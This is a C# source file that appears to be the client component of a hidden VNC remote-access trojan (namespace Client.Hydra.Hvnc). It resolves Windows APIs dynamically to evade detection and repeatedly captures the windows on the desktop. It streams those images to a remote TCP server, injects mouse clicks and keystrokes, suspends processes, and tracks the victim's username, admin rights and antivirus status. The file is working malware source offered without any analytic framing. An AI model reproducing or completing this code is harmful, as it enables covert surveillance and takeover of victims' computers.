using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Client.Hydra.Hvnc
{
	public static class focket
	{
		public delegate bool EnumDelegate(IntPtr hWnd, int lParam);

		public struct RECT
		{
			public int Left;

			public int Top;

			public int Right;

			public int Bottom;
		}

		public enum CWPFlags
		{
			CWP_ALL = 0
		}

		[Flags]
		public enum RedrawWindowFlags : uint
		{
			Invalidate = 1u,
			InternalPaint = 2u,
			Erase = 4u,
			Validate = 8u,
			NoInternalPaint = 0x10u,
			NoErase = 0x20u,
			NoChildren = 0x40u,
			AllChildren = 0x80u,
			UpdateNow = 0x100u,
			EraseNow = 0x200u,
			Frame = 0x400u,
			NoFrame = 0x800u
		}

		[Flags]
		public enum ThreadAccess
		{
			TERMINATE = 1,
			SUSPEND_RESUME = 2,
			GET_CONTEXT = 8,
			SET_CONTEXT = 0x10,
			SET_INFORMATION = 0x20,
			QUERY_INFORMATION = 0x40,
			SET_THREAD_TOKEN = 0x80,
			IMPERSONATE = 0x100,
			DIRECT_IMPERSONATION = 0x200
		}

		[return: MarshalAs(UnmanagedType.Bool)]
		public delegate bool DelegateIsWindowVisible(IntPtr hWnd);

		public delegate bool DelegateEnumDesktopWindows(IntPtr hDesktop, EnumDelegate lpEnumCallbackFunction, IntPtr lParam);

		public delegate bool DelegatePrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);

		public delegate bool DelegateGetWindowRect(IntPtr hWnd, ref RECT lpRect);

		public delegate IntPtr DelegateWindowFromPoint(Point p);

		public delegate IntPtr DelegateGetWindow(IntPtr hWnd, uint uCmd);

		[return: MarshalAs(UnmanagedType.Bool)]
		public delegate bool DelegateIsZoomed(IntPtr hwnd);

		public delegate IntPtr DelegateGetParent(IntPtr hwnd);

		public delegate int DelegateGetSystemMetrics(int nIndex);

		public static TcpClient Client = new TcpClient();

		public static NetworkStream nstream;

		public static string ip;

		public static int port;

		public static string Identifier;

		public static string Mutex;

		public static string username;

		public static string isadmin;

		public static string avstatus;

		public static string RecoveryResults;

		public static int screenx = 1028;

		public static int screeny = 1028;

		public static IntPtr lastactive;

		public static IntPtr lastactivebar;

		public static int interval = 500;

		public static int quality = 50;

		public static double resize = 0.5;

		public static int TitleBarHeight;

		public static bool HigherThan81 = false;

		public static readonly DelegateIsWindowVisible IsWindowVisible = focket.LoadApi<DelegateIsWindowVisible>("user32", "IsWindowVisible");

		public static readonly DelegateEnumDesktopWindows EnumDesktopWindows = focket.LoadApi<DelegateEnumDesktopWindows>("user32", "EnumDesktopWindows");

		public static readonly DelegatePrintWindow PrintWindow = focket.LoadApi<DelegatePrintWindow>("user32", "PrintWindow");

		public static readonly DelegateGetWindowRect GetWindowRect = focket.LoadApi<DelegateGetWindowRect>("user32", "GetWindowRect");

		public static readonly DelegateWindowFromPoint WindowFromPoint = focket.LoadApi<DelegateWindowFromPoint>("user32", "WindowFromPoint");

		public static readonly DelegateGetWindow GetWindow = focket.LoadApi<DelegateGetWindow>("user32", "GetWindow");

		public static readonly DelegateIsZoomed IsZoomed = focket.LoadApi<DelegateIsZoomed>("user32", "IsZoomed");

		public static readonly DelegateGetParent GetParent = focket.LoadApi<DelegateGetParent>("user32", "GetParent");

		public static readonly DelegateGetSystemMetrics GetSystemMetrics = focket.LoadApi<DelegateGetSystemMetrics>("user32", "GetSystemMetrics");

		public static int startxpos;

		public static int startypos = 0;

		public static int startwidth;

		public static int startheight = 0;

		public static IntPtr handletomove;

		public static IntPtr handletoresize;

		public static IntPtr contextmenu;

		public static bool rightclicked = false;

		public static ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();

		public static string MPath;

		public static string MFile;

		public static Process procM = new Process();

		public static string tempFile;

		public static Computer a = new Computer();

		public static List<string> collection = new List<string>();

		public static object collection2 = new List<IntPtr>();

		public static Thread newt = new Thread(new ThreadStart(SCT));

		[DllImport("kernel32", SetLastError = true)]
		public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

		public static CreateApi LoadApi<CreateApi>(string name, string method)
		{
			return Conversions.ToGenericParameter<CreateApi>(Marshal.GetDelegateForFunctionPointer(focket.GetProcAddress(focket.LoadLibraryA(ref name), ref method), typeof(CreateApi)));
		}

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SendMessage(int hWnd, int Msg, int wparam, int lparam);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		[DllImport("user32.dll", EntryPoint = "FindWindowEx", SetLastError = true)]
		public static extern IntPtr FindWindowEx2(IntPtr hWnd1, IntPtr hWnd2, IntPtr lpsz1, string lpsz2);

		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern uint SuspendThread(IntPtr hThread);

		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool CloseHandle(IntPtr hHandle);

		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern uint ResumeThread(IntPtr hThread);

		public static IntPtr FindHandle(string title)
		{
			focket.collection = new List<string>();
			focket.collection2 = new List<IntPtr>();
			checked
			{
				EnumDelegate lpEnumCallbackFunction = delegate(IntPtr hWnd, int lParam)
				{
					bool result = false;
					try
					{
						StringBuilder stringBuilder = new StringBuilder(255);
						IntPtr hWnd2 = hWnd;
						int countOfChars = stringBuilder.Capacity + 1;
						IntPtr result2 = IntPtr.Zero;
						_ = (int)focket.SendMessageTimeoutText(hWnd2, 13, countOfChars, stringBuilder, 2, 1000u, out result2);
						string text = stringBuilder.ToString();
						if (focket.IsWindowVisible(hWnd) && !string.IsNullOrEmpty(text))
						{
							object instance = focket.collection2;
							object[] array = new object[1] { hWnd };
							object[] array2 = array;
							bool[] array3 = new bool[1] { true };
							NewLateBinding.LateCall(instance, null, "Add", array, null, null, array3, IgnoreReturn: true);
							if (array3[0])
							{
								hWnd = (IntPtr)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(IntPtr));
							}
							focket.collection.Add(text);
						}
						result = true;
						return result;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						return result;
					}
				};
				focket.EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero);
				for (int i = focket.collection.Count - 1; i >= 0; i += -1)
				{
					if (focket.collection[i].ToLower().Contains(title.ToLower()))
					{
						object obj = NewLateBinding.LateIndexGet(focket.collection2, new object[1] { i }, null);
						if (obj == null)
						{
							return (IntPtr)0;
						}
						return (IntPtr)obj;
					}
				}
				return (IntPtr)0;
			}
		}

		public static void SendInformation(Stream stream, object message)
		{
			if (message == null)
			{
				return;
			}
			BinaryFormatter binaryFormatter = new BinaryFormatter();
			binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
			binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
			binaryFormatter.FilterLevel = TypeFilterLevel.Full;
			checked
			{
				lock (focket.Client)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(message);
					ulong num = 0uL;
					MemoryStream memoryStream = new MemoryStream();
					binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
					num = (ulong)memoryStream.Position;
					focket.Client.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
					byte[] buffer = memoryStream.GetBuffer();
					focket.Client.GetStream().Write(buffer, 0, (int)num);
					memoryStream.Close();
					memoryStream.Dispose();
				}
			}
		}

		public static object IsFileOpen(FileInfo file)
		{
			object result = null;
			if (file.Exists)
			{
				try
				{
					file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None).Close();
					result = false;
					return result;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					if (ex is IOException)
					{
						result = true;
						ProjectData.ClearProjectError();
						return result;
					}
					ProjectData.ClearProjectError();
					return result;
				}
			}
			return result;
		}

		public static void SuspendProcess(Process process)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = process.Threads.GetEnumerator();
				while (enumerator.MoveNext())
				{
					IntPtr intPtr = focket.OpenThread(ThreadAccess.SUSPEND_RESUME, bInheritHandle: false, checked((uint)((ProcessThread)enumerator.Current).Id));
					if (intPtr != IntPtr.Zero)
					{
						focket.SuspendThread(intPtr);
						focket.CloseHandle(intPtr);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		public static void ResumeProcess(Process process)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = process.Threads.GetEnumerator();
				while (enumerator.MoveNext())
				{
					IntPtr intPtr = focket.OpenThread(ThreadAccess.SUSPEND_RESUME, bInheritHandle: false, checked((uint)((ProcessThread)enumerator.Current).Id));
					if (intPtr != IntPtr.Zero)
					{
						focket.ResumeThread(intPtr);
						focket.CloseHandle(intPtr);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		public static void PostClickLD(int x, int y)
		{
			IntPtr intPtr = (focket.lastactive = focket.WindowFromPoint(new Point(x, y)));
			RECT lpRect = default(RECT);
			focket.GetWindowRect(intPtr, ref lpRect);
			checked
			{
				Point point = new Point(x - lpRect.Left, y - lpRect.Top);
				IntPtr intPtr2 = focket.FindWindow("#32768", null);
				if (intPtr2 != IntPtr.Zero)
				{
					focket.contextmenu = intPtr2;
					focket.PostMessage(lParam: (IntPtr)focket.MakeLParam(x, y), hWnd: focket.contextmenu, Msg: 513u, wParam: new IntPtr(1));
					focket.rightclicked = true;
				}
				else if (focket.GetParent(intPtr) == (IntPtr)0 && y - lpRect.Top < focket.TitleBarHeight)
				{
					focket.lastactivebar = intPtr;
					focket.PostMessage(intPtr, 513u, (IntPtr)1, (IntPtr)focket.MakeLParam(x - lpRect.Left, y - lpRect.Top));
					focket.startxpos = x;
					focket.startypos = y;
					focket.handletomove = intPtr;
					focket.SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 3u);
					focket.SetWindowPos(intPtr, new IntPtr(-1), 0, 0, 0, 0, 3u);
					focket.SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 67u);
				}
				else if (focket.GetParent(intPtr) == (IntPtr)0 && point.X > lpRect.Right - lpRect.Left - 10 && point.Y > lpRect.Bottom - lpRect.Top - 10)
				{
					focket.startwidth = x;
					focket.startheight = y;
					focket.handletoresize = intPtr;
				}
				else
				{
					focket.PostMessage(intPtr, 513u, (IntPtr)1, (IntPtr)focket.MakeLParam(x - lpRect.Left, y - lpRect.Top));
				}
			}
		}

		public static void PostClickLU(int x, int y)
		{
			IntPtr hWnd = focket.WindowFromPoint(new Point(x, y));
			RECT lpRect = default(RECT);
			focket.GetWindowRect(hWnd, ref lpRect);
			checked
			{
				if (focket.rightclicked)
				{
					focket.PostMessage(focket.contextmenu, 514u, new IntPtr(1), (IntPtr)focket.MakeLParam(x, y));
					focket.rightclicked = false;
					focket.contextmenu = IntPtr.Zero;
				}
				else if ((focket.startxpos > 0) | (focket.startypos > 0))
				{
					focket.PostMessage(focket.handletomove, 514u, (IntPtr)0L, (IntPtr)focket.MakeLParam(x - lpRect.Left, y - lpRect.Top));
					RECT lpRect2 = default(RECT);
					focket.GetWindowRect(focket.handletomove, ref lpRect2);
					int num = x - focket.startxpos;
					int num2 = y - focket.startypos;
					_ = lpRect2.Left + num;
					_ = lpRect2.Top + num2;
					focket.SetWindowPos(focket.handletomove, new IntPtr(0), lpRect2.Left + num, lpRect2.Top + num2, lpRect2.Right - lpRect2.Left, lpRect2.Bottom - lpRect2.Top, 64u);
					focket.startxpos = 0;
					focket.startypos = 0;
					focket.handletomove = IntPtr.Zero;
				}
				else if ((focket.startwidth > 0) | (focket.startheight > 0))
				{
					RECT lpRect3 = default(RECT);
					focket.GetWindowRect(focket.handletoresize, ref lpRect3);
					int num3 = x - focket.startwidth;
					int num4 = y - focket.startheight;
					focket.SetWindowPos(cx: lpRect3.Right - lpRect3.Left + num3, cy: lpRect3.Bottom - lpRect3.Top + num4, hWnd: focket.handletoresize, hWndInsertAfter: new IntPtr(0), X: lpRect3.Left, Y: lpRect3.Top, uFlags: 64u);
					focket.startwidth = 0;
					focket.startheight = 0;
					focket.handletoresize = IntPtr.Zero;
				}
				else
				{
					focket.PostMessage(hWnd, 514u, (IntPtr)0L, (IntPtr)focket.MakeLParam(x - lpRect.Left, y - lpRect.Top));
				}
			}
		}

		public static void PostClickRD(int x, int y)
		{
			IntPtr hWnd = focket.WindowFromPoint(new Point(x, y));
			RECT lpRect = default(RECT);
			focket.GetWindowRect(hWnd, ref lpRect);
			checked
			{
				new Point(x - lpRect.Left, y - lpRect.Top);
				focket.PostMessage(focket.lastactive = focket.WindowFromPoint(new Point(x, y)), 516u, (IntPtr)0L, (IntPtr)focket.MakeLParam(x - lpRect.Left, y - lpRect.Top));
			}
		}

		public static void PostClickRU(int x, int y)
		{
			IntPtr hWnd = focket.WindowFromPoint(new Point(x, y));
			RECT lpRect = default(RECT);
			focket.GetWindowRect(hWnd, ref lpRect);
			checked
			{
				new Point(x - lpRect.Left, y - lpRect.Top);
				focket.PostMessage(focket.WindowFromPoint(new Point(x, y)), 517u, (IntPtr)0L, (IntPtr)focket.MakeLParam(x - lpRect.Left, y - lpRect.Top));
			}
		}

		public static void PostDblClk(int x, int y)
		{
			IntPtr hWnd = focket.WindowFromPoint(new Point(x, y));
			RECT lpRect = default(RECT);
			focket.GetWindowRect(hWnd, ref lpRect);
			checked
			{
				new Point(x - lpRect.Left, y - lpRect.Top);
				focket.PostMessage(focket.lastactive = focket.WindowFromPoint(new Point(x, y)), 515u, (IntPtr)0L, (IntPtr)focket.MakeLParam(x - lpRect.Left, y - lpRect.Top));
			}
		}

		public static void PostMove(int x, int y)
		{
			IntPtr hWnd = focket.WindowFromPoint(new Point(x, y));
			RECT lpRect = default(RECT);
			focket.GetWindowRect(hWnd, ref lpRect);
			focket.PostMessage(hWnd, 512u, (IntPtr)0L, (IntPtr)checked(focket.MakeLParam(x - lpRect.Left, y - lpRect.Top)));
		}

		public static void PostKeyDown(string k)
		{
			int num = Strings.AscW(k);
			if (num == 8 || num == 13)
			{
				focket.PostMessage(focket.lastactive, 256u, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(k))), focket.CreateLParamFor_WM_KEYDOWN(1, 30, IsExtendedKey: false, DownBefore: false));
				focket.PostMessage(focket.lastactive, 257u, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(k))), focket.CreateLParamFor_WM_KEYUP(1, 30, IsExtendedKey: false));
			}
			else
			{
				focket.PostMessage(focket.lastactive, 258u, (IntPtr)Strings.AscW(k), (IntPtr)1);
			}
		}

		public static IntPtr KeysLParam(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore, bool State)
		{
			int num = RepeatCount | (ScanCode << 16);
			if (IsExtendedKey)
			{
				num |= 0x10000;
			}
			if (DownBefore)
			{
				num |= 0x40000000;
			}
			if (State)
			{
				num |= int.MinValue;
			}
			return new IntPtr(num);
		}

		public static IntPtr CreateLParamFor_WM_KEYDOWN(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore)
		{
			return focket.KeysLParam(RepeatCount, ScanCode, IsExtendedKey, DownBefore, State: false);
		}

		public static IntPtr CreateLParamFor_WM_KEYUP(ushort RepeatCount, byte ScanCode, bool IsExtendedKey)
		{
			return focket.KeysLParam(RepeatCount, ScanCode, IsExtendedKey, DownBefore: true, State: true);
		}

		public static int MakeLParam(int LoWord, int HiWord)
		{
			return (HiWord << 16) | (LoWord & 0xFFFF);
		}

		public static void SCT()
		{
			while (true)
			{
				try
				{
					focket.SendInformation(message: focket.RenderScreenshot(), stream: focket.nstream);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(focket.interval);
			}
		}

		public static Bitmap RenderScreenshot()
		{
			Bitmap result = null;
			checked
			{
				try
				{
					List<IntPtr> t = new List<IntPtr>();
					EnumDelegate lpEnumCallbackFunction = delegate(IntPtr hWnd, int lParam)
					{
						bool result2 = false;
						try
						{
							if (focket.IsWindowVisible(hWnd))
							{
								t.Add(hWnd);
							}
							result2 = true;
							return result2;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
							return result2;
						}
					};
					if (focket.EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero))
					{
						Bitmap bitmap = new Bitmap(focket.screenx, focket.screeny);
						for (int i = t.Count - 1; i >= 0; i += -1)
						{
							try
							{
								RECT lpRect = default(RECT);
								focket.GetWindowRect(t[i], ref lpRect);
								Bitmap image = new Bitmap(lpRect.Right - lpRect.Left + 1, lpRect.Bottom - lpRect.Top + 1);
								Graphics graphics = Graphics.FromImage(image);
								IntPtr hdc = graphics.GetHdc();
								try
								{
									if (focket.HigherThan81)
									{
										focket.PrintWindow(t[i], hdc, 2u);
									}
									else
									{
										focket.PrintWindow(t[i], hdc, 0u);
									}
								}
								catch (Exception projectError)
								{
									ProjectData.SetProjectError(projectError);
									ProjectData.ClearProjectError();
								}
								graphics.ReleaseHdc(hdc);
								graphics.FillRectangle(Brushes.Gray, lpRect.Right - lpRect.Left - 10, lpRect.Bottom - lpRect.Top - 10, 10, 10);
								Graphics.FromImage(bitmap).DrawImage(image, lpRect.Left, lpRect.Top);
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						Bitmap bitmap2 = new Bitmap(bitmap, (int)Math.Round((double)focket.screenx * focket.resize), (int)Math.Round((double)focket.screeny * focket.resize));
						ImageCodecInfo encoder = focket.get_Codec("image/jpeg");
						EncoderParameters encoderParameters = new EncoderParameters(1);
						encoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, focket.quality);
						MemoryStream stream = new MemoryStream();
						bitmap2.Save(stream, encoder, encoderParameters);
						Bitmap obj = (Bitmap)Image.FromStream(stream);
						bitmap2.Dispose();
						GC.Collect();
						result = obj;
						return result;
					}
					return result;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					focket.SendInformation(focket.nstream, "60|" + ex.ToString());
					try
					{
						result = focket.ReturnBMP();
						ProjectData.ClearProjectError();
						return result;
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}

		public static ImageCodecInfo get_Codec(string type)
		{
			if (type == null)
			{
				return null;
			}
			ImageCodecInfo[] array = focket.codecs;
			foreach (ImageCodecInfo imageCodecInfo in array)
			{
				if (Operators.CompareString(imageCodecInfo.MimeType, type, TextCompare: false) == 0)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		public static Bitmap ReturnBMP()
		{
			Bitmap bitmap = new Bitmap(focket.screenx, focket.screeny);
			using Graphics graphics = Graphics.FromImage(bitmap);
			graphics.FillRectangle((SolidBrush)Brushes.Red, 0, 0, focket.screenx, focket.screeny);
			return bitmap;
		}

		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SendMessageTimeout", SetLastError = true)]
		public static extern uint SendMessageTimeoutText(IntPtr hWnd, int Msg, int countOfChars, StringBuilder text, int flags, uint uTImeoutj, out IntPtr result);

		public static object Isgreaterorequalto81()
		{
			object result = null;
			try
			{
				OperatingSystem oSVersion = Environment.OSVersion;
				Version version = oSVersion.Version;
				if (oSVersion.Platform == PlatformID.Win32NT && version.Major == 6 && version.Minor != 0 && version.Minor != 1)
				{
					result = true;
					return result;
				}
				result = false;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool ShowWindow(IntPtr hWnd, [MarshalAs(UnmanagedType.I4)] int nCmdShow);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
	}
}
